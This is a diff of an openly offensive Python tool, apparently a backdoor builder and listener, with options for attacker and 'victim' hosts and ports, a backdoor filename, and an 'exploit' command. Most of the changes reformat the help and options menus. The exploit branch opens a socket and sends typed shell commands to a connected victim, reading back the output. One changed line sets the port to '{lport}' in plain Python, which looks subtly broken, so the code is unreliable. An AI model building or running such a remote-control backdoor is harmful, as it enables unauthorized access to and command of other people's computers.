@@ -38,19 +38,21 @@ while session:
 	if text_main == "help":
 		print("")
 		print('''
-  command                 options
+============================================
+| command                 options          |
 ============================================  
-| set filename            Created File Backdoor
-|
-| exploit                 run exploit victim
-|
-| set lhost               set ip system attack
-| set lport               set port system attack
-|
-| set rhost               set ip victim
-| set rport               set port victim 
-|
-| options                 show options
+| set lhost        set ip system attack    |
+| set lport        set port system attack  |
+|                                          |
+| set rhost        set ip victim           |
+| set rport        set port victim         |
+|                                          |
+| set filename     Created File Backdoor   |
+|                                          |
+| options          show options            |
+| help             helping for tools       |
+| exploit          run exploit victim      |
+| run              run exploit victim      |
 ============================================
 ''')
 		print("")
@@ -82,6 +84,7 @@ while session:
 		print("")
 		print(f"[*] set RPORT : {rport}")
 		print("")
+
 
 
 	elif text_main == "set filename":
@@ -141,18 +144,18 @@ while True:
 
 	elif text_main == "options":
 		print(f'''
-=========================
-(SYSTEM IP)
-LHOST  : {lhost}
-LPORT  : {lport}
+======================================
+| options | IP              | PORT   |   
+|=====================================
+| LHOST   : {lhost}           {lport}
+| RHOST   : {rhost}           {rport}
+======================================
 
-(VICTIM IP)
-RHOST  : {rhost}
-RPORT  : {rport}
-
-(PATH FILE)
-FILEPATH : {filename}.py
-=========================
+=======================
+| options |  File name|
+=======================
+| FILENAME | {filename}
+=======================
 ''')
 
 	elif text_main == "exploit":
@@ -161,7 +164,7 @@ FILEPATH : {filename}.py
 		import sys
 
 		IP = f'{lhost}'
-		PORT = 4444
+		PORT = {lport}
 
 		s = socket.socket(socket.AF_INET,
 			socket.SOCK_STREAM)
@@ -204,4 +207,3 @@ FILEPATH : {filename}.py
 		          conn.send(command.encode())
 		          output = conn.recv(1024)
 		          print("\n", output, "\n")
-	    
